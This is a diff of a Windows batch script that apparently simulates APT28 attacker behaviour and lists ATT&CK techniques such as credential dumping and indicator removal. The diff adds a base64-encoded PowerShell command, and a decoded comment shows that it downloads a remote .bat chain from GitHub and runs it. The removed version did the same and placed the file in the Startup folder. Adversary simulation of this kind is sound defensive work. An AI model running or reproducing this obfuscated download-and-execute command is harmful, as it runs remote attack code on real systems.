@@ -13,20 +13,24 @@ ECHO     [+] T1059  Command-Line Interface
 ECHO     [+] T1057  Process Discovery
 ECHO     [+] T1105  Remote File Copy
 ECHO     [+] T1083  File and Directory Discovery
+ECHO     [+] T1119	Automated Collection
+ECHO     [+] T1005	Data from Local System
 ECHO     [+] T1085  Rundll32
 ECHO     [+] T1064  Scripting
+ECHO     [+] T1003	Credential Dumping
 ECHO     [+] T1075  Pass the Hash
 ECHO     [+] T1074  Data Staged
+ECHO     [+] T1037	Logon Scripts
 ECHO     [+] T1099  Timestomp
 ECHO     [+] T1107  File Deletion
+ECHO     [+] T1002	Data Compressed
+ECHO     [+] T1158	Hidden Files and Directories
 ECHO     [+] T1070  Indicator Removal on Host
 ECHO -------------------------------------------------------------------
-::powershell -enc UABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQBwACAAYgB5AHAAYQBzAHMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBnAHIAZQB5AGMAZQBsAC8AcABvAGMALwBtAGEAcwB0AGUAcgAvAEEAUABUADEAOQBfAFMAeQBzAGkAbgBmAG8AIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwARwByAGUAeQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABBAFAAVAAxADkAXwBTAHQAYQByAHQAdQBwAC4AYgBhAHQAIgApAA==
+powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwByAGUAeQBjAGUAbAAvAEEAUABUAC0AUwBpAG0AdQBsAGEAdABpAG8AbgAvAG0AYQBzAHQAZQByAC8AQQBQAFQAMgA4AC8AQQBQAFQAMgA4AF8AQwBoAGEAaQBuAFIAZQBhAGMAdABpAG8AbgAvAEEAUABUADIAOABfAEMAaABhAGkAbgBfAE8AZgBfAFQAZQBjAGgAbgBpAHEAdQBlAHMALgBiAGEAdAAiACwAIgBDADoAXABVAHMAZQByAHMAXABHAHIAZQB5AFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAFAAVAAyADgAXABBAFAAVAAyADgAXwBDAGgAYQBpAG4AXwBPAGYAXwBUAGUAYwBoAG4AaQBxAHUAZQBzAC4AYgBhAHQAIgApADsAIABzAHQAYQByAHQALQBwAHIAbwBjAGUAcwBzACAAIgBjAG0AZAAuAGUAeABlACIAIAAiAC8AYwAgAEMAOgBcAFUAcwBlAHIAcwBcAEcAcgBlAHkAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAEEAUABUADIAOABcAEEAUABUADIAOABfAEMAaABhAGkAbgBfAE8AZgBfAFQAZQBjAGgAbgBpAHEAdQBlAHMALgBiAGEAdAAiAA==
 ECHO -------------------------------------------------------------------
 ::Decoded-Payload: 
 ::------------------
-:: Powershell -ep bypass (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/poc/master/APT19_Sysinfo`",`"$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\APT19_Startup.bat`")"
-cmd /k tasklist 
+:: (New-Object Net.WebClient).Downloadfile(`"https://raw.githubusercontent.com/greycel/APT-Simulation/master/APT28/APT28_ChainReaction/APT28_Chain_Of_Techniques.bat`",`"$env:temp\APT28\APT28_Chain_Of_Techniques.bat`"); start-process `"cmd.exe`" `"/c $env:temp\APT28\APT28_Chain_Of_Techniques.bat`"
 ECHO.
-
 
